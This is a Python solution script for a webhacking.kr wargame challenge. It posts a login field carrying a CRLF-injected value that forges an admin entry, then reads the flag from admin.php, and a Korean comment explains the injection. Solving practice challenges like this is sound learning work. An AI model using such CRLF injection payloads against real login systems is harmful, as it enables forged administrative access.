from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/bonus-9"
URI = "/index.php"
PHPSESSID = 'jl43tngbl1sca1cumqkf3dhm57'

COOKIES = {
    'PHPSESSID' : PHPSESSID
}

DATA = {
    'id' : """guest\r\n121.141.65.137:admin"""
}

# 풀이
# 1. URL Encoding을 이용하여 CRLF (Carrage Return, Line Feed) 특수 문자를 전송했을때
#    웹페이지에서 CRLF가 실제로 먹히는 것을 이용하여 로그인 시도 다음에 admin 관련 로그인 정보를
#    강제 주입하는 방식으로 로그인 성공

resp = requests.post(URL + URI, cookies=COOKIES, data=DATA)

URI = "/admin.php"

resp = requests.get(URL + URI, cookies=COOKIES)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)